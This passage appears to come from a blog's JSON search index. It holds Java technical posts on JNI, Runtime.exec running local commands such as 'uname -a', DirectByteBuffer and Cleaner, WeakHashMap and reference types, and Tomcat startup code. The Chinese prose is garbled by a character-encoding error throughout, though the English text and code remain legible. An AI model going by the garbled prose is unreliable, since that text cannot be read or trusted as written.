è‡ªå·±å‚è€ƒç€å†™äº†jniçš„ä¸€äº›ç”¨ä¾‹ï¼Œå‰©ä¸‹çš„å°±æ˜¯ç…§ç€oracleçš„docä¸€ä¸ªä¸ªå»å°è¯•å‚æ•°å’Œæ–¹æ³•äº† æ¯”å¦‚ä»jniå±‚è¿”å›ä¸€ä¸ªjavaå¯¹è±¡æ¯”å¦‚åœ¨jniå±‚æŸ¥çœ‹java nativeæ–¹æ³•ç©¿è¿‡æ¥çš„å‚æ•°çš„å€¼æ¯”å¦‚é€šè¿‡jniä¿®æ”¹ä¸€ä¸ªfinal å˜é‡çš„å€¼ã€‚å…¶å®ç…§ç€docæ¥å‡ ä¹ä¸ä¼šå‡ºé”™æ¯”å¦‚åœ¨jniå±‚åœ¨ä¸€æ¡c++çº¿ç¨‹ä¸­é€šè¿‡AttachCurrentThreadæ–¹æ³•å›è°ƒjava 3.3 javaè°ƒç”¨ç³»ç»Ÿæ–¹æ³•javaæœ‰ä¸€ä¸ªProcess apijavaä¸­Processçš„Apiå…³é”®è¯ï¼šProcessBuilder , java9æä¾›äº†æ–°çš„Apiã€‚å¦å¤–è¿˜æœ‰Runtime.execè¿™ä¸ªæ–¹æ³•äº²æµ‹ï¼Œä¸‹é¢çš„å‘½ä»¤å¯ä»¥åœ¨macä¸Šæ‰§è¡Œuname -a å‘½ä»¤ //ç”¨ProcessBuilderæ˜¯ä¸€ç§åšæ³• try { Runtime r = Runtime.getRuntime(); Process p = r.exec(&quot;uname -a&quot;); p.waitFor(); BufferedReader b = new BufferedReader(new InputStreamReader(p.getInputStream())); String line = &quot;&quot;; while ((line = b.readLine()) != null) { System.out.println(line); } b.close(); }catch (IOException | InterruptedException e){ } // ä¸‹é¢è¿™ä¸ªä¹Ÿè¡Œ String s = null; try { // run the Unix &quot;ps -ef&quot; command // using the Runtime exec method: Process p = Runtime.getRuntime().exec(&quot;ps -ef&quot;); BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream())); BufferedReader stdError = new BufferedReader(new InputStreamReader(p.getErrorStream())); // read the output from the command System.out.println(&quot;Here is the standard output of the command:\\n&quot;); while ((s = stdInput.readLine()) != null) { System.out.println(s); } // read any errors from the attempted command System.out.println(&quot;Here is the standard error of the command (if any):\\n&quot;); while ((s = stdError.readLine()) != null) { System.out.println(s); } System.exit(0); } catch (IOException e) { System.out.println(&quot;exception happened - here&#39;s what I know: &quot;); e.printStackTrace(); System.exit(-1); } åªä¸è¿‡å¾ˆå°‘è§è¿‡ç”¨javaå»è°ƒç”¨ç³»ç»Ÿæ¥å£çš„","tags":[]},{"title":"å †å¤–å†…å­˜ï¼ŒweakHashMapä»¥åŠå››ç§å¼•ç”¨ç±»å‹çš„ç ”ç©¶","date":"2019-07-28T22:34:37.000Z","path":"2019/07/28/2019-07-28-from-directByteBuffer-to-PhantomReference/","text":"DirectByteBufferï¼ˆå †å¤–å†…å­˜ï¼‰æ˜¯åˆ†é…åœ¨jvmä»¥å¤–çš„å†…å­˜ï¼Œè¿™ä¸ªjavaå¯¹è±¡æœ¬èº«æ˜¯å—jvm gcæ§åˆ¶çš„ï¼Œä½†æ˜¯å…¶æŒ‡å‘çš„å †å¤–å†…å­˜æ˜¯å¦‚ä½•å›æ”¶çš„ javaä¸­æœ‰å››ç§å¼•ç”¨ Strong ReferenceSoft Reference ï¼ˆè½¯å¼•ç”¨ï¼‰Weak Reference ï¼ˆå¼±å¼•ç”¨ï¼‰PhantomReference Referenceï¼ˆè™šå¼•ç”¨ï¼‰ é™¤äº†å¼ºå¼•ç”¨ï¼Œå¦å¤–ä¸‰ä¸ªclasséƒ½ç»§æ‰¿è‡ªReferenceè¿™ä¸ªçˆ¶ç±»ï¼Œå…¶æ„é€ å‡½æ•°æœ‰ä¸¤ä¸ª //referent ä¸ºå¼•ç”¨æŒ‡å‘çš„å¯¹è±¡ Reference(T referent) { this(referent, null); } //ReferenceQueueå¯¹è±¡ï¼Œå¯ä»¥ç®€å•ç†è§£ä¸ºä¸€ä¸ªé˜Ÿåˆ— //GC åœ¨æ£€æµ‹åˆ°appropriate reachability changesä¹‹åï¼Œ //ä¼šæŠŠå¼•ç”¨å¯¹è±¡æœ¬èº«æ·»åŠ åˆ°è¿™ä¸ªqueueä¸­ï¼Œä¾¿äºæ¸…ç†å¼•ç”¨å¯¹è±¡æœ¬èº« Reference(T referent, ReferenceQueue&lt;? super T&gt; queue) { this.referent = referent; this.queue = (queue == null) ? ReferenceQueue.NULL : queue; } è°ƒç”¨è™šå¼•ç”¨çš„getæ–¹æ³•ï¼Œæ€»ä¼šè¿”å›nullï¼Œä¸è½¯å¼•ç”¨å’Œå¼±å¼•ç”¨ä¸åŒçš„æ˜¯ï¼Œè™šå¼•ç”¨è¢«enqueuedæ—¶ï¼ŒGC å¹¶ä¸ä¼šè‡ªåŠ¨æ¸…ç†è™šå¼•ç”¨æŒ‡å‘çš„å¯¹è±¡ï¼Œåªæœ‰å½“æŒ‡å‘è¯¥å¯¹è±¡çš„æ‰€æœ‰è™šå¼•ç”¨å…¨éƒ¨è¢«æ¸…ç†ï¼ˆenqueuedåï¼‰åæˆ–å…¶æœ¬èº«ä¸å¯è¾¾æ—¶ï¼Œè¯¥å¯¹è±¡æ‰ä¼šè¢«æ¸…ç†ã€‚ å¦‚æœä¸€ä¸ªå¯¹è±¡åªå…·æœ‰è™šå¼•ç”¨ï¼Œé‚£ä¹ˆå®ƒå°±å’Œæ²¡æœ‰ä»»ä½•å¼•ç”¨ä¸€æ ·ï¼Œä»»ä½•æ—¶å€™éƒ½å¯èƒ½è¢«gcå›æ”¶ã€‚è½¯ï¼ˆå¼±ã€è™šï¼‰å¼•ç”¨å¿…é¡»å’Œä¸€ä¸ªå¼•ç”¨é˜Ÿåˆ—ï¼ˆReferenceQueueï¼‰ä¸€èµ·ä½¿ç”¨ï¼Œå½“gcå›æ”¶è¿™ä¸ªè½¯ï¼ˆå¼±ã€è™šï¼‰å¼•ç”¨å¼•ç”¨çš„å¯¹è±¡æ—¶ï¼Œä¼šæŠŠè¿™ä¸ªè½¯ï¼ˆå¼±ã€è™šï¼‰å¼•ç”¨æ”¾åˆ°è¿™ä¸ªå¼•ç”¨é˜Ÿåˆ—ä¸­ã€‚æ¯”å¦‚ï¼Œä¸Šè¿°çš„Entryæ˜¯ä¸€ä¸ªå¼±å¼•ç”¨ï¼Œå®ƒå¼•ç”¨çš„å¯¹è±¡æ˜¯keyï¼Œå½“keyè¢«å›æ”¶æ—¶ï¼ŒEntryä¼šè¢«æ”¾åˆ°queueä¸­ã€‚ WeakHashMappublic class WeakHashMap&lt;K,V&gt; extends AbstractMap&lt;K,V&gt; implements Map&lt;K,V&gt; { private final ReferenceQueue&lt;Object&gt; queue = new ReferenceQueue&lt;&gt;(); /** * Constructs a new, empty &lt;tt&gt;WeakHashMap&lt;/tt&gt; with the default initial * capacity (16) and load factor (0.75). */ public WeakHashMap() { this(DEFAULT_INITIAL_CAPACITY, DEFAULT_LOAD_FACTOR); } //è¿™æ˜¯openjdk1.8çš„æºç  //è‡³å°‘ä»æ„é€ å‡½æ•°å¯ä»¥çœ‹å‡ºæ¥ï¼Œé»˜è®¤çš„å®¹é‡æ˜¯16ã€‚ } å€¼å¾—æ³¨æ„çš„æ˜¯å†…éƒ¨æœ‰ä¸€ä¸ªReferenceQueueã€‚WeakHashMapçš„æ ¸å¿ƒå®šä¹‰æ˜¯ï¼š ä¸€æ—¦keyä¸å†è¢«å¤–éƒ¨æŒæœ‰ï¼Œè¿™ä¸ªEntryå°†åœ¨æœªæ¥çš„æŸä¸€æ—¶åˆ»è¢«å¹²æ‰ã€‚oracle java doc for weakHashMapä¸­æåˆ°ï¼ŒWeakHashMapçš„keyæœ€å¥½æ˜¯é‚£ç§equalsæ˜¯ç›´æ¥ä½¿ç”¨==çš„ï¼Œå½“ç„¶ä½¿ç”¨Stringè¿™ç§equalsæ˜¯æ¯”è¾ƒå®é™…å†…å®¹çš„ä¹Ÿå¯ä»¥ã€‚ä½†ä¼šå¸¦æ¥ä¸€äº›confusingçš„ç°è±¡ã€‚ This class is intended primarily for use with key objects whose equals methods test for object identity using the == operator. Once such a key is discarded it can never be recreated, so it is impossible to do a lookup of that key in a WeakHashMap at some later time and be surprised that its entry has been removed. This class will work perfectly well with key objects whose equals methods are not based upon object identity, such as String instances. With such recreatable key objects, however, the automatic removal of WeakHashMap entries whose keys have been discarded may prove to be confusing. åœ¨å†…éƒ¨ç»“æ„æ–¹é¢ï¼Œå’Œjdk1.7çš„HashMapå·®ä¸å¤šï¼Œéƒ½æ˜¯æ‹‰é“¾æ³•æ¥è§£å†³å“ˆå¸Œå†²çªWeakHashMapå¥‡æ€ªçš„ç‚¹çœ‹ä¸‹é¢è¿™ä¸ªä¾‹å­å°±çŸ¥é“äº† public class TestWeakHashMap { private String str1 = new String(&quot;newString1&quot;); //this entry will be removed soon private String str2 = &quot;literalString2&quot;; private String str3 = &quot;literalString3&quot;; private String str4 = new String(&quot;newString4&quot;); //this entry will be removed soon private Map map = new WeakHashMap(); void testGC() throws IOException { map.put(str1, new Object()); map.put(str2, new Object()); map.put(str3, new Object()); map.put(str4, new Object()); /** * Discard the strong reference to all the keys */ str1 = null; str2 = null; str3 = null; str4 = null; while (true) { System.gc(); /** * Verify Full GC with the -verbose:gc option * We expect the map to be emptied as the strong references to * all the keys are discarded. */ System.out.println(&quot;map.size(); = &quot; + map.size() + &quot; &quot; + map); // map.size(); = 2 {literalString3=java.lang.Object@266474c2, literalString2=java.lang.Object@6f94fa3e} } } public static void main(String[] args) { try { new TestWeakHashMap().testGC(); } catch (IOException e) { e.printStackTrace(); } } } è¿™é‡Œæä¸€å¥ï¼Œå¦‚æœæ˜¯ç”¨string.internæå‡ºæ¥çš„keyï¼Œé‚£ä¹ˆæ°¸è¿œéƒ½ä¸ä¼šè¢«ç§»é™¤ã€‚ WeakHashMapçœ‹ä¸Šå»å°±åƒæœ‰ä¸€æ¡ä¸“é—¨çš„çº¿ç¨‹åœ¨åå°æ‚„æ‚„çš„æ¸…ç†é‚£äº›keyå·²ç»æ²¡æœ‰å…¶ä»–å¼•ç”¨çš„Entryã€‚è¿™ä¸ªæ¸…ç†Entryçš„æ–¹æ³•å«åšexpungeStaleEntriesï¼Œå°±æ˜¯ä¸“é—¨ç”¨äºæ¸…é™¤é‚£äº›å¤±æ•ˆçš„Entryçš„ã€‚WeakHashmapä¸­çš„keyè¢«åŒ…è¿›ä¸€ä¸ªWeakReferenceä¸­ï¼Œå½“è¿™ä¸ªreferenceå‡ºç°åœ¨ReferenceQueueä¸­çš„æ—¶å€™ï¼Œå°±æ„å‘³ç€è¿™ä¸ªkeyå·²ç»æ²¡æœ‰åœ°æ–¹ç”¨åˆ°äº†ã€‚ä½†æ˜¯è¿™ä¸ªWeakReferenceå¯¹è±¡è¿˜è¦å¹²æ‰ï¼ŒexpungeStaleEntrieså°±æ˜¯ä»queueä¸­å–å‡ºæ‰€æœ‰çš„WeakReference(Entry)ï¼Œè¿™é‡Œå½“ç„¶ä¸ä¼šè°ƒç”¨WeakReferenceçš„getæ–¹æ³•ï¼Œè€Œæ˜¯ä½¿ç”¨hashï¼Œæ‰¾åˆ°å…¶åœ¨tablesä¸­çš„ä½ç½®ï¼Œå†ä»é“¾è¡¨ä¸­æ‰¾åˆ°è¿™ä¸ªentryï¼Œnullæ‰value(å› ä¸ºvalueè¢«entryå¼ºå¼•ç”¨ï¼Œè¿™ä¸€æ­¥åªæ˜¯å¸®åŠ©gc)ï¼Œå°†è¿™ä¸ªentryä»é“¾è¡¨ä¸­ç§»é™¤ã€‚(é‚£ä¹ˆè¿™ä¸ªWeakReferenceå¯¹è±¡å°±å½»åº•æ²¡æœ‰ä»»ä½•å¼•ç”¨äº†ï¼Œåé¢gcä¼šfreeæ‰è¿™éƒ¨åˆ†çš„memory) è¿™ä¸ªæ–¹æ³•ä¼šåœ¨å¾ˆå¤šæ–¹æ³•é‡Œç›´æ¥æˆ–è€…é—´æ¥è°ƒç”¨åˆ°put,get,size,removeå‡ ä¹æ‰€æœ‰çš„crudæ–¹æ³•éƒ½ä¼šåœ¨æ–¹æ³•çš„æœ€å¼€å¤´è°ƒç”¨è¿™ä¸ªæ–¹æ³•æ¥ç§»é™¤staleçš„Entryã€‚ ä¸Šé¢è¯´åˆ°å¥½åƒæœ‰ä¸€æ¡çº¿ç¨‹ä¸“é—¨åœ¨åå°æ‚„æ‚„çš„æŠŠä¸ç”¨çš„referenceæ”¾åˆ°queueé‡Œé¢ï¼Œè¿™æ¡çº¿ç¨‹æ˜¯å­˜åœ¨çš„ã€‚java.lang.ref.Reference.ReferenceHandler,æ˜¯Referenceçš„private static å†…éƒ¨class /* High-priority thread to enqueue pending References */ private static class ReferenceHandler extends Thread { public void run() { while (true) { tryHandlePending(true); } } } //ä¸Šé¢çš„æ³¨é‡Šæåˆ°high priorityï¼Œå¤šé«˜çš„ä¼˜å…ˆçº§å‘¢ã€‚ //è¿™æ®µè¯å†™åœ¨Reference.javaé‡Œé¢ static { ThreadGroup tg = Thread.currentThread().getThreadGroup(); for (ThreadGroup tgn = tg; tgn != null; tg = tgn, tgn = tg.getParent()); Thread handler = new ReferenceHandler(tg, &quot;Reference Handler&quot;); /* If there were a special system-only priority greater than * MAX_PRIORITY, it would be used here */ handler.setPriority(Thread.MAX_PRIORITY); //æ€»ä¹‹å°±æ˜¯å¾ˆé«˜çš„ä¼˜å…ˆçº§ handler.setDaemon(true); // å®ˆæŠ¤çº¿ç¨‹ä¸€èˆ¬åœ¨ç¨‹åºè¿è¡Œçš„æ—¶å€™åœ¨åå°æä¾›ä¸€ç§é€šç”¨æœåŠ¡çš„çº¿ç¨‹ handler.start(); } é‡ç‚¹:å››ç§çŠ¶æ€(å‡ºå¤„è§å‚è€ƒ) æ¯ä¸€æ—¶åˆ»ï¼ŒReferenceå¯¹è±¡éƒ½å¤„äºä¸‹é¢å››ç§çŠ¶æ€ä¸­ã€‚è¿™å››ç§çŠ¶æ€ç”¨Referenceçš„æˆå‘˜å˜é‡queueä¸nextï¼ˆç±»ä¼¼äºå•é“¾è¡¨ä¸­çš„nextï¼‰æ¥è¡¨ç¤ºã€‚ ReferenceQueue&lt;? super T&gt; queue;Reference next; Activeã€‚æ–°åˆ›å»ºçš„å¼•ç”¨å¯¹è±¡éƒ½æ˜¯è¿™ä¸ªçŠ¶æ€ï¼Œåœ¨ GC æ£€æµ‹åˆ°å¼•ç”¨å¯¹è±¡å·²ç»åˆ°è¾¾åˆé€‚çš„reachabilityæ—¶ï¼ŒGC ä¼šæ ¹æ®å¼•ç”¨å¯¹è±¡æ˜¯å¦åœ¨åˆ›å»ºæ—¶åˆ¶å®šReferenceQueueå‚æ•°è¿›è¡ŒçŠ¶æ€è½¬ç§»ï¼Œå¦‚æœæŒ‡å®šäº†ï¼Œé‚£ä¹ˆè½¬ç§»åˆ°Pendingï¼Œå¦‚æœæ²¡æŒ‡å®šï¼Œè½¬ç§»åˆ°Inactiveã€‚åœ¨è¿™ä¸ªçŠ¶æ€ä¸­ //å¦‚æœæ„é€ å‚æ•°ä¸­æ²¡æŒ‡å®šqueueï¼Œé‚£ä¹ˆqueueä¸ºReferenceQueue.NULLï¼Œå¦åˆ™ä¸ºæ„é€ å‚æ•°ä¸­ä¼ é€’è¿‡æ¥çš„queuequeue = ReferenceQueue || ReferenceQueue.NULLnext = null Pendingã€‚pending-Referenceåˆ—è¡¨ä¸­çš„å¼•ç”¨éƒ½æ˜¯è¿™ä¸ªçŠ¶æ€ï¼Œå®ƒä»¬ç­‰ç€è¢«å†…éƒ¨çº¿ç¨‹ReferenceHandlerå¤„ç†ï¼ˆä¼šè°ƒç”¨ReferenceQueue.enqueueæ–¹æ³•ï¼‰ã€‚æ²¡æœ‰æ³¨å†Œçš„å®ä¾‹ä¸ä¼šè¿›å…¥è¿™ä¸ªçŠ¶æ€ã€‚åœ¨è¿™ä¸ªçŠ¶æ€ä¸­ //æ„é€ å‚æ•°å‚æ•°ä¸­ä¼ é€’è¿‡æ¥çš„queuequeue = ReferenceQueuenext = è¯¥queueä¸­çš„ä¸‹ä¸€ä¸ªå¼•ç”¨ï¼Œå¦‚æœæ˜¯è¯¥é˜Ÿåˆ—ä¸­çš„æœ€åä¸€ä¸ªï¼Œé‚£ä¹ˆä¸ºthis Enqueuedã€‚è°ƒç”¨ReferenceQueue.enqueuedæ–¹æ³•åçš„å¼•ç”¨å¤„äºè¿™ä¸ªçŠ¶æ€ä¸­ã€‚æ²¡æœ‰æ³¨å†Œçš„å®ä¾‹ä¸ä¼šè¿›å…¥è¿™ä¸ªçŠ¶æ€(å°±æ˜¯æ²¡æœ‰èµ°ä¸¤ä¸ªå‚æ•°çš„æ„é€ å‡½æ•°çš„é‚£ç§)ã€‚åœ¨è¿™ä¸ªçŠ¶æ€ä¸­ queue = ReferenceQueue.ENQUEUEDnext = è¯¥queueä¸­çš„ä¸‹ä¸€ä¸ªå¼•ç”¨ï¼Œå¦‚æœæ˜¯è¯¥é˜Ÿåˆ—ä¸­çš„æœ€åä¸€ä¸ªï¼Œé‚£ä¹ˆä¸ºthis Inactiveã€‚æœ€ç»ˆçŠ¶æ€ï¼Œå¤„äºè¿™ä¸ªçŠ¶æ€çš„å¼•ç”¨å¯¹è±¡ï¼ŒçŠ¶æ€ä¸ä¼šå†æ”¹å˜ã€‚åœ¨è¿™ä¸ªçŠ¶æ€ä¸­ queue = ReferenceQueue.NULLnext = this æœ‰äº†è¿™äº›çº¦æŸï¼ŒGC åªéœ€è¦æ£€æµ‹nextå­—æ®µå°±å¯ä»¥çŸ¥é“æ˜¯å¦éœ€è¦å¯¹è¯¥å¼•ç”¨å¯¹è±¡é‡‡å–ç‰¹æ®Šå¤„ç† å¦‚æœnextä¸ºnullï¼Œé‚£ä¹ˆè¯´æ˜è¯¥å¼•ç”¨ä¸ºActiveçŠ¶æ€å¦‚æœnextä¸ä¸ºnullï¼Œé‚£ä¹ˆ GC åº”è¯¥æŒ‰å…¶æ­£å¸¸é€»è¾‘å¤„ç†è¯¥å¼•ç”¨ï¼ˆå°±æ˜¯èµ°åŠ å…¥queueé‚£ä¸€å¥—ï¼‰ã€‚ å¦‚æœæ„é€ å‡½æ•°ä¸­æŒ‡å®šäº†ReferenceQueueï¼Œé‚£ä¹ˆäº‹åç¨‹åºå‘˜å¯ä»¥é€šè¿‡è¯¥é˜Ÿåˆ—æ¸…ç†å¼•ç”¨å¦‚æœæ„é€ å‡½æ•°ä¸­æ²¡æœ‰æŒ‡å®šäº†ReferenceQueueï¼Œé‚£ä¹ˆ GC ä¼šè‡ªåŠ¨æ¸…ç†å¼•ç”¨tryHandlePendingä¼šå°†å½“å‰çš„staticçš„ä¸€ä¸ªReference(pending)åŠ å…¥åˆ°r.queueé‡Œé¢,åŒæ—¶è®¾ç½®pendingä¸ºpending.discoveredã€‚(è¿™ä¸ªdiscoveredæ˜¯vmèµ‹å€¼çš„ï¼Œgcç»™javaå±‚ç•™äº†ä¸ªå£å­ï¼Œå°†æ²¡æœ‰å…¶ä»–å¼•ç”¨çš„Referenceèµ‹å€¼åˆ°è¿™é‡Œäº†ï¼Œå‰ææ˜¯Referenceæ˜¯è°ƒç”¨å¸¦ReferenceQueueçš„æ„é€ å‡½æ•°åˆ›å»ºçš„)è¿™é‡Œå¤´è‚¯å®šæœ‰jniè°ƒç”¨ï¼Œå…·ä½“åŸç†ä¸æ¸…æ¥šã€‚ tryHandlePendingåˆ¤æ–­æå–å‡ºæ¥çš„Referenceæ˜¯å¦æ˜¯Cleanerè¿™ä¸ªclassï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œç›´æ¥è°ƒç”¨Cleaner.cleanï¼ˆï¼‰å¦åˆ™æ‰§è¡Œå°†è¿™ä¸ªReferenceåŠ å…¥åˆ°Queueï¼ˆè¿™ä¸ªReferenceçš„Queueï¼‰é‡Œé¢ public class Cleaner extends PhantomReference&lt;Object&gt; { // cleanerä¸€èˆ¬ç”¨è¿™ç§é™æ€å‡½æ•°åˆ›å»ºå‡ºæ¥å¯ä»¥è®¤ä¸ºæ˜¯æä¾›ä¸€ä¸ªå›è°ƒäº† public static Cleaner create(Object ob, Runnable thunk) { if (thunk == null) return null; return add(new Cleaner(ob, thunk)); } } è‡³äºä¸ºä»€ä¹ˆtryHandlePendingè¿™ä¸ªæ–¹æ³•ä»è¿™ä¸ªé“¾è¡¨é‡Œé¢æå…ƒç´ çš„æ—¶å€™ä¼šæå‡ºæ¥ä¸€ä¸ªCleanerå‘¢ï¼Œå› ä¸ºCleaneréƒ½æ˜¯è¿™ä¹ˆåˆ›å»ºå‡ºæ¥çš„ï¼Œéƒ½æ˜¯ç”¨å¸¦Queueçš„æ„é€ å‡½æ•°åˆ›å»ºçš„ã€‚ private Cleaner(Object referent, Runnable thunk) { super(referent, dummyQueue); //è¿™ä¸ªSuperæ˜¯PhantomReferenceï¼Œå†å¾€ä¸Šæ˜¯Reference this.thunk = thunk; } PhantomReferenceæ˜¯æœ€å¼±çš„å¼•ç”¨äº†ã€‚DirectByteBufferæ˜¯è¿™æ ·åˆ›å»ºCleanerçš„ï¼š cleaner = Cleaner.create(this, new Deallocator(base, size, cap)); Deallocatorçš„runæ–¹æ³•é‡Œé¢å°±æ˜¯è°ƒç”¨Unsafeçš„æ–¹æ³•æ ¹æ®addresså»freeå†…å­˜ï¼Œè¿™å°±æ˜¯nioçš„DirectByteBufferæ˜¯å¦‚ä½•ç®¡ç†å †å¤–å†…å­˜çš„åŸç†äº†ã€‚ äºæ˜¯stackoverflowä¸Šå°±å‡ºç°äº†â€å¦‚ä½•é‡Šæ”¾DirectByteBufferçš„native memoryâ€çš„æ–¹æ¡ˆ import sun.misc.Cleaner; import sun.nio.ch.DirectBuffer; public static void clean(ByteBuffer bb) { if(bb == null) return; Cleaner cleaner = ((DirectBuffer) bb).cleaner(); if (cleaner != null) cleaner.clean(); } import sun.misc.Cleaner; import java.lang.reflect.Field; import java.nio.ByteBuffer; ... public static void main(String[] args) throws Exception { ByteBuffer direct = ByteBuffer.allocateDirect(1024); Field cleanerField = direct.getClass().getDeclaredField(&quot;cleaner&quot;); cleanerField.setAccessible(true); Cleaner cleaner = (Cleaner) cleanerField.get(direct); cleaner.clean(); } ä¸æ³¨æ„å°±ç”¨åˆ°äº†sunçš„packageäº†ï¼Œå› ä¸ºsun.xxxè¿™äº›packageä¸‹é¢çš„classéƒ½æ˜¯åœ¨rt.jaré‡Œé¢ï¼Œç”±BootStrapClassLoaderåŠ è½½ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨è¿™ä¸ªpackageã€‚ä¸è¿‡å¥½åƒjava9å¼€å§‹sunè¿™ä¸ªåŒ…ä¸‹é¢çš„ä¸œè¥¿é»˜è®¤ä¸èƒ½ç”¨äº†ã€‚ ç»éªŒ WeakHashMapçš„keyå€¾å‘äºä½¿ç”¨é‚£ç§equalsæ˜¯ç›´æ¥æ¯”è¾ƒ==çš„ï¼Œè€Œä¸æ˜¯è‡ªå·±å®ç°hashCodeçš„é‚£ä¸€å¥— debugçš„æ—¶å€™æœ‰æ—¶å€™ä¼šçœ‹è§â€œReference Handlerâ€è¿™ä¹ˆä¸€æ¡çº¿ç¨‹ï¼Œå°±æ˜¯è´Ÿè´£è¿­ä»£å¼•ç”¨é“¾è¡¨çš„ Referenceçš„æ„é€ å‡½æ•°å¦‚æœä¼ å…¥äº†ReferenceQueueï¼Œç›¸å½“äºç»™è¿™ä¸ªReferenceçš„gcäº‹ä»¶æŒ‚äº†ä¸ªé’©å­,å¤§è‡´ç›¸å½“äºreference.addWillGCListenerï¼ŒDirectByteBufferå°±æ˜¯è¿™ä¹ˆå¹²çš„ã€‚å¾ˆç†Ÿæ‚‰æ˜¯å—ï¼Œfinalizerï¼ˆåªæ˜¯æ›´åŠ è½»é‡çº§ï¼‰ã€‚ WeakHashMapçš„valueæ˜¯å¼ºå¼•ç”¨ï¼Œä¸è¦å»æŒæœ‰keyã€‚ æœ€åä»æ³¨é‡Šé‡Œé¢å¯ä»¥çœ‹å‡ºæ¥ï¼Œjava.lan.refè¿™ä¸‹é¢çš„å¾ˆå¤šclassæ˜¯Mark Reinholdå†™çš„ã€‚ Mark Reinhold is Chief Architect of the Java Platform Group at Oracle. His past contributions to the platform include character-stream readers and writers, reference objects, shutdown hooks, the NIO high-performance I/O APIs, library generification, and service loaders. Mark was the lead engineer for the JDK 1.2 and 5.0 releases, the JCP specification lead for Java SE 6, and both the project and specification lead for JDK 7 (Java SE 7) and JDK 8 (Java SE 8). He currently leads the JDK 9 and Jigsaw projects in the OpenJDK Community, where he also serves on the Governing Board. Mark holds a Ph.D. in computer science from the Massachusetts Institute of Technology. Brian Goetz is the Java Language Architect at Oracle, and was the specification lead for JSR-335 (Lambda Expressions for the Java Programming Language.) He is the author of the best-selling Java Concurrency in Practice, as well as over 75 articles on Java development, and has been fascinated by programming since Jimmy Carter was President. å‚è€ƒjava WeakHashMap","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"},{"name":"tbd","slug":"tbd","permalink":"https://haldir65.github.io/tags/tbd/"}]},{"title":"Tomcatéƒ¨åˆ†æºç è§£æ","date":"2019-07-28T21:50:29.000Z","path":"2019/07/28/2019-07-28-tomcat-source-code-grep/","text":"Tomcatæºç è§£æ tomcatçš„ä½¿ç”¨å¾ˆç®€å•ï¼Œwindowsä¸‹åŒå‡»é‚£ä¸ªstartup.batæˆ–è€…cd åˆ°binç›®å½•ï¼Œè¿è¡Œcatlina runå°±å¯ä»¥äº†ã€‚é…ç½®çš„è¯ï¼Œç”¨xmlæ–‡ä»¶å°±å¯ä»¥äº†ï¼Œé™æ€æ–‡ä»¶æ”¾åœ¨webapp/ç›®å½•ä¸‹ã€‚ã€‚ ä»Spring-bootæ”¯æŒçš„embedded servlet containerå°±èƒ½çœ‹å‡ºæ¥ï¼Œtomcatçš„æ›¿ä»£å“æœ‰ä¸å°‘spring-boot-starter-undertow,spring-boot-starter-jetty,spring-boot-starter-tomcat æºç ç‰ˆæœ¬tomcat 9.0.21 ä»mainå‡½æ•°å¼€å§‹å§tomcatçš„ä¸»å‡½æ•°åœ¨org.apache.catalina.startup.Bootstrapè¿™ä¸ªæ–‡ä»¶ä¸­ public final class Bootstrap { public static void main(String args[]) { Bootstrap bootstrap = new Bootstrap(); try { bootstrap.init(); } catch (Throwable t) { t.printStackTrace(); return; } //æ¥ä¸‹æ¥å°±æ˜¯æ ¹æ®ä¸åŒçš„commandæ‰§è¡Œå¯¹åº”çš„start,stopç­‰å‘½ä»¤ try { String command = &quot;start&quot;; if (args.length &gt; 0) { command = args[args.length - 1]; } if (command.equals(&quot;startd&quot;)) { args[args.length - 1] = &quot;start&quot;; daemon.load(args); daemon.start(); } else if (command.equals(&quot;stopd&quot;)) { args[args.length - 1] = &quot;stop&quot;; daemon.stop(); } else if (command.equals(&quot;start&quot;)) { daemon.setAwait(true); daemon.load(args); daemon.start(); if (null == daemon.getServer()) { System.exit(1); } } else if (command.equals(&quot;stop&quot;)) { daemon.stopServer(args); } else if (command.equals(&quot;configtest&quot;)) { daemon.load(args); if (null == daemon.getServer()) { System.exit(1); } System.exit(0); } else { log.warn(&quot;Bootstrap: command \\&quot;&quot; + command + &quot;\\&quot; does not exist.&quot;); } } } } initçš„è°ƒç”¨æ ˆTomcatèƒ½å¤Ÿå¤„ç†ajp(ä¸å¸¸ç”¨ï¼Œæ— è§†)å’Œhttpåè®®ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒServeråªæœ‰ä¸€ä¸ªServiceç»„ä»¶ï¼ŒServiceç»„ä»¶å…ˆåå¯¹Engineã€Connectorè¿›è¡Œåˆå§‹åŒ–ã€‚è€ŒEngineç»„ä»¶å¹¶ä¸ä¼šåœ¨åˆå§‹åŒ–é˜¶æ®µå¯¹å­å®¹å™¨è¿›è¡Œåˆå§‹åŒ–ï¼ŒHostã€Contextã€Wrapperå®¹å™¨çš„åˆå§‹åŒ–æ˜¯åœ¨starté˜¶æ®µå®Œæˆçš„ã€‚tomcaté»˜è®¤ä¼šå¯ç”¨HTTP1.1å’ŒAJPçš„Connectorè¿æ¥å™¨ï¼Œè¿™ä¸¤ç§åè®®é»˜è®¤ä½¿ç”¨Http11NioProtocolã€AJPNioProtocolè¿›è¡Œå¤„ç† Connectorçš„ä¸»è¦åŠŸèƒ½ï¼Œæ˜¯æ¥æ”¶è¿æ¥è¯·æ±‚ï¼Œåˆ›å»ºRequestå’ŒResponseå¯¹è±¡ç”¨äºå’Œè¯·æ±‚ç«¯äº¤æ¢æ•°æ®ï¼›ç„¶ååˆ†é…çº¿ç¨‹è®©Engineï¼ˆä¹Ÿå°±æ˜¯Servletå®¹å™¨ï¼‰æ¥å¤„ç†è¿™ä¸ªè¯·æ±‚ï¼Œå¹¶æŠŠäº§ç”Ÿçš„Requestå’ŒResponseå¯¹è±¡ä¼ ç»™Engineã€‚å½“Engineå¤„ç†å®Œè¯·æ±‚åï¼Œä¹Ÿä¼šé€šè¿‡Connectorå°†å“åº”è¿”å›ç»™å®¢æˆ·ç«¯ã€‚ 